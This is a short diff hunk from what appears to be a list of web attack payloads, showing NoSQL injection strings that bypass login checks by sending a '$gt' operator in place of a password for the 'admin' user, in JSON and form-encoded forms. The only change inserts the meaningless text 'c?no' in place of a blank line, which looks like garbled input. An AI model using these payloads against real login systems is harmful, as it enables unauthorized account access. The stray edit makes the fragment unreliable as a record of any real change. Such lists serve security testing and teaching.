@@ -22,7 +22,7 @@ JSF*ck Payload:
 
 NoSQL Example 1:
 {"username":"admin","password":{"$gt":""}}
-
+c?no
 NoSQL Example 2:
 username=admin&password[$gt]=&submit=login
 username[$gt]=admin&password[$gt]=&submit=login
